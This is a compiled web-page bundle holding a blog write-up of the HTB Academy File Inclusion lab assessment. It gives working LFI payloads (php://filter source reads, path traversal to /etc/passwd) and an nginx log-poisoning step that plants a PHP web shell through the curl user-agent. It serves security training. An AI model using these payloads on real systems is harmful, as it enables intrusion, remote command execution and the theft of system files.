"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[118],{2190:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>a,contentTitle:()=>l,default:()=>p,frontMatter:()=>r,metadata:()=>c,toc:()=>h});var t=i(5893),s=i(1151);const r={slug:"/write-up/htb-academy/file-inclusion",pagination_next:null,pagination_prev:null},l=void 0,c={id:"Hacking/Write-ups/Academy/File Inclusion/File inclusion",title:"File inclusion",description:"This is the write-up for the assessment of HTB academy File inclusion module.",source:"@site/docs/Hacking/Write-ups/Academy/File Inclusion/File inclusion.md",sourceDirName:"Hacking/Write-ups/Academy/File Inclusion",slug:"/write-up/htb-academy/file-inclusion",permalink:"/docs/write-up/htb-academy/file-inclusion",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/write-up/htb-academy/file-inclusion",pagination_next:null,pagination_prev:null},sidebar:"tutorialSidebar"},a={},h=[];function o(e){const n={a:"a",code:"code",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(n.p,{children:["This is the write-up for the assessment of HTB academy ",(0,t.jsx)(n.a,{href:"https://academy.hackthebox.com/module/details/23",children:"File inclusion"})," module."]}),"\n",(0,t.jsx)(n.p,{children:"This a little bit tricky because we know which vulnerability to exploit here: file inclusion."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"whatweb 94.237.49.11:31840/index.php           \nhttp://94.237.49.11:31840/index.php [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.18.0], IP[94.237.49.11], JQuery[3.3.1], PHP[7.3.22], Script, Title[InlaneFreight], X-Powered-By[PHP/7.3.22], nginx[1.18.0]\n"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"whatweb"})," reveals we're dealing with a PHP/7.3.22 page served by an nginx/1.18.0."]}),"\n",(0,t.jsxs)(n.p,{children:["While navigating as a regular user in the website, we can see the URL has a ",(0,t.jsx)(n.code,{children:"page"})," parameter which looks promising for LFI vulnerability."]}),"\n",(0,t.jsxs)(n.p,{children:["Visiting ",(0,t.jsx)(n.a,{href:"http://94.237.49.11:31840/index.php?page=industries../",children:"http://94.237.49.11:31840/index.php?page=industries../"})," shows ",(0,t.jsx)(n.code,{children:"Invalid input detected!"})," which is the contents of ",(0,t.jsx)(n.code,{children:"error.php"})," page."]}),"\n",(0,t.jsx)(n.p,{children:"Let's try the basic bypasses:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"Double the input: ./ become ..//. Nothing"}),"\n",(0,t.jsx)(n.li,{children:"URL encode the symbols: nothing"}),"\n",(0,t.jsx)(n.li,{children:"Try to escape the approve path: N/A because the pages are in root"}),"\n",(0,t.jsx)(n.li,{children:"Path truncation: N/A PHP version is recent"}),"\n",(0,t.jsx)(n.li,{children:"Null byte: N/A PHP version is recent"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Let's try with more complex bypasses:"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main",children:"http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main"})}),"\n",(0,t.jsx)(n.p,{children:"Worked and return the content of the main.php in base64"}),"\n",(0,t.jsxs)(n.p,{children:["In index.php we discover a commented piece of code that makes reference to ",(0,t.jsx)(n.code,{children:"ilf_admin/index.php"}),". If we try to access that page, we get something interesting showing some logs. Worth remembering: ",(0,t.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php?log=system.log",children:"http://94.237.49.11:31840/ilf_admin/index.php?log=system.log"})]}),"\n",(0,t.jsx)(n.p,{children:"The filtering mechanism looks quite simple:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:'  $page = $_GET[\'page\'];\n  if (strpos($page, "..") !== false) {\n    include "error.php";\n  }\n  else {\n    include $page . ".php";\n  }\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd",children:"http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd"})}),"\n",(0,t.jsx)(n.p,{children:"Looks like might be vulnerable to double encoding, however we're only bypassing the first if and the include only let us include php files."}),"\n",(0,t.jsxs)(n.p,{children:["Let's get back to ",(0,t.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php",children:"http://94.237.49.11:31840/ilf_admin/index.php"})]}),"\n",(0,t.jsx)(n.p,{children:"We can try to brute-force some directories:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"ffuf -w /opt/github/SecLists/Discovery/Web-Content/combined_directories.txt:FUFF -u http://94.237.49.11:31840/ilf_admin/FUFF.php\nffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.49.11:31840/ilf_admin/index.php?FUZZ=value' -fl 102\n"})}),"\n",(0,t.jsx)(n.p,{children:"Nothing revealed."}),"\n",(0,t.jsx)(n.p,{children:"However, we can try the LFI directly in the log paramter:"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php",children:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php"})," and it worked!"]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.a,{href:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd",children:"http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd"})," we have read the passwd file!"]}),"\n",(0,t.jsx)(n.p,{children:"In order to have Remote Code Excecution, let's try to see if we can have Remote File Inclusion and add our shell."}),"\n",(0,t.jsxs)(n.p,{children:["We cannot include Remote files, checking the nginx error log, looks like they might be using ",(0,t.jsx)(n.code,{children:"file_get_contents"})," or something like this."]}),"\n",(0,t.jsxs)(n.p,{children:["Given we have access to logs, we can poison them and force ",(0,t.jsx)(n.code,{children:"ilf_admin"})," to execute them by setting the user-agent of curl:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'curl -s "http://94.237.59.185:42603/index.php" -A "<?php system($_GET[\'cmd\']); ?>"\n'})}),"\n",(0,t.jsx)(n.p,{children:"And now we have a web shell running in the logs page:"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id",children:"http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id"})}),"\n",(0,t.jsx)(n.p,{children:"From here we can move to a reverse shell"})]})}function p(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},1151:(e,n,i)=>{i.d(n,{Z:()=>c,a:()=>l});var t=i(7294);const s={},r=t.createContext(s);function l(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);